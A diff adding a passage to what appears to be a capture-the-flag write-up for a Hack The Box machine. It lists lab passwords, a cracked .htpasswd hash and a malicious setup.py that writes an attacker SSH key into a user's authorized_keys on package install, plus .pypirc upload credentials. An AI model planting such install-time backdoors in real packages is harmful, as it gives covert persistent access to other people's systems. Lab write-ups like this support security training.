@@ -152,3 +152,69 @@ The first steps I always take are converting shell to full tty shell
     fg
 ``` 
 ### 2-user access
+
+after connecting to server i tried to get `usr.txt` but  can't 
+![Screenshot from 2020-10-07 17-39-14](https://user-images.githubusercontent.com/36403473/95354773-1e9b3600-08c5-11eb-91e8-26956bf2b9d8.png)
+so i took developer privilege his password ` m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`
+![Screenshot from 2020-08-19 14-06-50](https://user-images.githubusercontent.com/36403473/95358441-5b692c00-08c9-11eb-9adc-d10aec84d9ed.png)
+in `/var/www/` directory i ffound another subdomain `pypi.sneakycorp.htb` so i added it to `etc/hosts` on my machine 
+in `pypi.sneakycorp.htb` directory i found `.hpasswd`.<br/>
+Firstly, i decrypted the hashed password it's MD5(APR)<br/> 
+password after decryption `soufianeelhaoui`<br/>
+
+I now have the privileges to upload my pypi server content
+So I have to look for a suitable Pypi Server. </br>
+`The idea is to have a pypi server so that we can upload or modify files, etc. So I looked for ways to upload to the pypi server and use it to take the powers of the user.`
+After searching, I found out how to install pypi server
+[pypi setup](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/)
+
+`
+The idea that I had in mind is to add the private ssh private to an empty autherized file, and from there, I can income via ssh and get low privileges.
+
+`
+
+i created a package directory in tmp directory :
+```
+        __init__.py
+    setup.py
+    setup.cfg
+    README.md
+```
+setup.py
+```
+from setuptools import setup ,find_packages
+try:
+ print ('hello')
+ with open('/home/low/.ssh/authorized_keys','w+') as f:
+  f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1fuNi1hqodCXMlrRpn0K4SLCwYnAaRs/Tm3HXW0GFNey/91O0xi0w/gmUB+g/+6ueXosZuiXaK0GeHw4rtb6ROuD7+cXhIDO2l0FYZOuvddgtYlsq5Tt2cchryRPJnBAVEbONPTvOBjnt1ucT6XnkjBFpVwOq5tB+ogwoJp66pNOVdGjtvB3gRFGW+dgew9VdK2FEX9+7zJGbieulRF+tV7pcCMer95ExX06A/3C9QA+E4vqsNWwlo46yR4O1ZVbsmDUPOs1p9oZpwjZjLJj4okUEhhbxxafWxdaHKfwaXrw350V5y2wqBy05PlCEdstxljQ9zc/FN3QnPojiCLFpueQ3YvaoCub64jJ5vt3umr9GGwC/Ws4OBO95VtgjpeC2wR1RKEy6Ej2UCFpTqdwgUDpLzfDPl92v4A+U0btowuI0FYzFJ3FcfYabLRpFXb2R73OSwIU1F7UHwML8lSsWLAaCUcgYhuRY7o73+pngmhdCJ93tFfat4hQBMWjuE=')
+except :
+  setup(
+  name="room", 
+  version="0.0.1",
+  author="deveoper",
+  author_email="deveoper@test.com",
+  description="A small example package",
+  long_description_content_type="text/markdown",
+  url="http:/test.com",
+  packages=find_packages(),
+  classifiers=["Programming Language :: Python :: 3","License :: OSI Approved :: MIT License","Operating System :: OS Independent",],
+  python_requires='>=3.6', 
+)
+ 
+```
+then create .pypirc file:
+```
+[distutils]
+index-servers =
+  pypi
+  room
+
+[pypi]
+username: kkkk 
+password: kkkk
+
+[room]
+repository: http://127.0.0.1:5000
+username: pypi 
+password: soufianeelhaoui
+```
